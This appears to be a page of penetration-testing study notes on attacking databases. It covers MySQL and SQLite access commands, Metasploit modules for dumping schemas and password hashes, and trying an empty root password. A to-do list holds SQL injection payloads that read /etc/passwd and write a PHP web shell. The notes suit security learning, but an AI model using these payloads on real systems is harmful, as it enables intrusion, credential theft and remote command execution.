# Exploit a database

You can find a course about [SQL](/_archives/info/databases/sql/index.md) (1Ô∏è‚É£), and another about [NoSQL](/_archives/info/databases/nosql/index.md) (2Ô∏è‚É£) on Memorize. To summarize, the former is used to store data in a predefined format (relational model), while the latter is used by databases that want flexibility, like adding properties only to some users.

> **Common DBMS are**: MySQL 1Ô∏è‚É£, Microsoft SQL  Server (MSSQL) 1Ô∏è‚É£, MongoDB 2Ô∏è‚É£, GraphQL 2Ô∏è‚É£, PostgresSQL 1Ô∏è‚É£.<br>
> **Other well-known DBMS**: MariaDB 1Ô∏è‚É£, SQLite 1Ô∏è‚É£, Redis 1Ô∏è‚É£, and Oracle 1Ô∏è‚É£.

<hr class="sep-both">

## Random notes (SQL)

<div class="row row-cols-md-2"><div>

* `service xxx status`: check if a service is enabled. 
  * `mysql`
  * `postgresql`
  * `...`

<span></span>

* `mysql -u root -p -h <ip>`: login as root to the database at `<ip>`
  * Use `mysql -u root -p` for a local database.
  * Try an empty password, as this is the default password for root.
  * Usually use the port **3306**
  * `sudo apt install default-mysql-client`

<span></span>

* In Metasploit
  * `auxiliary/scanner/mysql/mysql_schemadump`: dump cols+tables
  * `auxiliary/scanner/mysql/mysql_hashdump`: dump users+hash
  * `mysql_sql`: send SQL queries

<span></span>

* Script `mysql-enum` with nmap
</div><div>

Privilege Escalation

* [MySQL user-defined functions](https://redteamnation.com/mysql-user-defined-functions/).

Inside the SQL console, you may use

* `source <sql>`: in MySQL console, import a SQL file.

Note that even if you can insert a path, you should start the SQL console inside the folder with the SQL file, and only enter the filename. This is because, if the file is importing data from other files, it is less likely to still work if the statements are executed from another folder than the one with the script.

* `DESCRIBE <table>`: see the structure of `<table>`
</div></div>

<hr class="sep-both">

## Random notes (SQLite)

<div class="row row-cols-md-2"><div>

* `users.db`: an SQLite database

* `file users.db`: find the version of SQLite

* `sqlite3 users.db`: load the SQLite database
</div><div>

* List tables üßä: `.tables`

* List columns ü´ï: `PRAGMA table_info(some_table);`

Then, you can use most of the usual SQL syntax to steal data üí∞.
</div></div>

<hr class="sep-both">

## To-do

<div class="row row-cols-md-2"><div>

```
=> file permission (root)
UNION ALL SELECT LOAD_FILE('/etc/passwd')--
UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE
```

* `select sql from sqlite_master`
</div><div>

...
</div></div>